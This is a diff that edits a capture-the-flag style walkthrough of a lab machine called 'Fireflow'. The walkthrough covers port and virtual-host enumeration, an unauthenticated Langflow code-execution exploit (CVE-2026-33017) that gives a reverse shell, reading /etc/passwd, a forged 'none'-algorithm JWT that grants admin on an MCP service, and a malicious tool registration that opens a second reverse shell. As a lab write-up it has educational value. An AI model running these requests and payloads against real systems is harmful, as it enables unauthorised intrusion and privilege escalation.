@@ -21,10 +21,10 @@ difficulty: Medium
 ### Port scanning 
 
 
-The first step is to identify which services are exposed on the target. A full TCP scan helps determine the attack surface before any deeper inspection.
+I started with a full TCP scan to identify the services exposed by the target and establish the initial attack surface.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.23.119
 
 Warning: 10.129.23.119 giving up on port because retransmission cap hit (6).
@@ -38,7 +38,7 @@ PORT    STATE SERVICE
 Two ports are open: HTTPS and SSH. Let's perform a deeper service scan on these ports:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ nmap -sC -sV -p 22,443 -oN scans/deepscan.nmap 10.129.23.119
 
 Nmap scan report for fireflow.htb (10.129.23.119)
@@ -63,12 +63,12 @@ PORT    STATE SERVICE  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## Web enumeration 
+### Web Enumeration
 
 We first need to add this to /etc/hosts.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ echo "10.129.23.119 fireflow.htb" | sudo tee -a /etc/hosts"
 
 ```
@@ -76,9 +76,9 @@ By visiting http://fireflow.htb, we can see that it is mostly a static website.
 
 ![fireflow.htb](assets/fireflow.htb.png)
 
-let's do some directory enumeration to see if there are any interesting directories  
+I performed directory enumeration to identify additional application endpoints.
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ ffuf -u https://fireflow.htb/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt
 
         /'___\  /'___\           /'___\
@@ -104,10 +104,10 @@ ________________________________________________
 :: Progress: [20115/20115] :: Job [1/1] :: 442 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
 
 ```
-nothing special so let's move to subdomain enumeration to see if the target has any virtual hosts
+The directory scan did not reveal a useful entry point, so I continued with virtual-host enumeration.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ ffuf -u https://fireflow.htb -H "Host: FUZZ.fireflow.htb" -w $SECLISTS/Discovery/DNS/subdomains-top1million-20000.txt -fw 5
 
         /'___\  /'___\           /'___\
@@ -139,7 +139,7 @@ flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duratio
 The subdomain `flow.fireflow.htb` appears to be a valid virtual host. Adding it to the hosts file makes it reachable for further inspection.
 
 ```bash 
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ echo "10.129.23.119 flow.fireflow.htb" | sudo tee -a /etc/hosts
 
 ```
@@ -150,7 +150,7 @@ Visiting http://flow.fireflow.htb we found a login page for **Langflow** .
 The initial login flow does not appear to work as expected. After creating an account and attempting to sign in, it becomes clear that the account requires approval. That makes direct authentication less useful, so the next step is to enumerate the application endpoints.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ ffuf -u https://flow.fireflow.htb/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt -fw 132
 
         /'___\  /'___\           /'___\
@@ -184,7 +184,7 @@ health                  [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 11
 The discovery reveals three endpoints. The /health endpoint is not useful, while /logs appears to be restricted, so the /docs endpoint is the best candidate for further exploration.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ curl https://flow.fireflow.htb/docs -k
 
     <!DOCTYPE html>
@@ -221,11 +221,13 @@ oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
 ```
 The documentation references /openapi.json, which can be queried directly to inspect the API and identify the installed version.
 
-## Initial Foothold : Shell as www-data
+## Exploitation
+
+### Initial Foothold as `www-data`
 
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ curl https://flow.fireflow.htb/openapi.json -k | jq | grep -C 3 version
   % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                  Dload  Upload  Total   Spent   Left   Speed
@@ -241,7 +243,7 @@ The documentation references /openapi.json, which can be queried directly to ins
 
 ![fireflow.htb](assets/cvelookup.png)
 
-#### About CVE-2026-33017
+### CVE-2026-33017
 
 The vulnerability exists because the vulnerable endpoint accepts attacker-controlled workflow definitions and then executes embedded Python code with `exec()` without sandboxing. This makes it possible to achieve unauthenticated remote code execution when the attacker supplies crafted workflow data.
 
@@ -255,7 +257,7 @@ Clicking it redirects us to **https://flow.fireflow.htb/playground/7d84d636-af65
 
 The proof of concept requires at least one public flow, so the next step is to adapt the exploit and execute it against the vulnerable endpoint. A listener is set up to receive the reverse shell.
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow'   -H 'Content-Type: application/json'   -b 'client_id=attacker'   -d '{
     "data": {
       "nodes": [{
@@ -315,7 +317,7 @@ The proof of concept requires at least one public flow, so the next step is to a
 
 The request succeeds and a reverse shell is established as `www-data`.
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ listen
 Listening on 0.0.0.0 4444
 Connection received on 10.129.23.119 41438
@@ -326,9 +328,9 @@ www-data@fireflow:/var/lib/langflow$
 
 ## Lateral Movement
 
-### User Flag and Shell as nightfall 
+### Shell as `nightfall`
 
-let's check the users that has a shell on the machine 
+I enumerated the local accounts with interactive shells to identify potential lateral-movement targets.
 ```bash
 www-data@fireflow:/var/lib/langflow$ cat /etc/passwd | grep sh
 cat /etc/passwd | grep sh
@@ -379,7 +381,7 @@ nightfall@fireflow:~$ cat user.txt
 
 ### MCP Service
 
-Now we are aiming to get root . Let's check our sudo privileges.
+With access as `nightfall`, I checked the account's delegated `sudo` privileges for a path to root.
 ```bash
 nightfall@fireflow:~$ sudo -l
 [sudo] password for nightfall:
@@ -427,10 +429,10 @@ nightfall@fireflow:~/.mcp$ curl 127.0.0.1:30080
 {"detail":"Not Found"}
 
 ```
-we can see it's returning a response so let's use ssh local tunneling so we can interact with it from our browser .
+The service responded locally. I therefore created an SSH tunnel to access it safely from my browser.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ ssh -L 30080:127.0.0.1:30080 nightfall@fireflow.htb
 nightfall@fireflow.htb's password:
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
@@ -474,7 +476,7 @@ nightfall@fireflow:~$
 Since the application exposes a web interface, the next logical step is directory enumeration 
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ ffuf -u http://127.0.0.1:30080/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt
 
         /'___\  /'___\           /'___\
@@ -507,7 +509,7 @@ The `/docs` endpoint exposes the service documentation, which is helpful for und
 
 The next step is to authenticate with the discovered credentials and test whether the application enforces role-based access correctly.
 ``` bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
   -H 'Content-Type: application/json' \
   -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
@@ -515,7 +517,7 @@ The next step is to authenticate with the discovered credentials and test whethe
 ```
 The authenticated user is not an administrator, so a direct request to the tools endpoint is rejected.
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ curl -X 'POST' \
   'http://127.0.0.1:30080/api/v1/tools' \
   -H 'accept: application/json' \
@@ -542,7 +544,7 @@ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRt
 
 We can now confirm that we have admin access by repeating the earlier request with the new token.
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ curl -X 'POST' \
   'http://127.0.0.1:30080/api/v1/tools' \
   -H 'accept: application/json' \
@@ -563,7 +565,7 @@ We can now confirm that we have admin access by repeating the earlier request wi
 The next step is to register a custom tool that executes a payload and opens a reverse shell. This allows us to break out of the container and land on a shell inside the Kubernetes environment.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ curl -X 'POST' \
   'http://127.0.0.1:30080/api/v1/tools' \
   -H 'accept: application/json' \
@@ -580,7 +582,7 @@ The next step is to register a custom tool that executes a payload and opens a r
 ```
 Now let's setup a listener and trigger the exploit 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ curl -X POST http://127.0.0.1:30080/mcp \
   -H 'Content-Type: application/json' \
   -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
@@ -589,7 +591,7 @@ Now let's setup a listener and trigger the exploit
 ```
 And Boommm! We got the shell 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Fireflow]
 └──╼ $ listen
 Listening on 0.0.0.0 4444
 Connection received on 10.129.23.119 53251
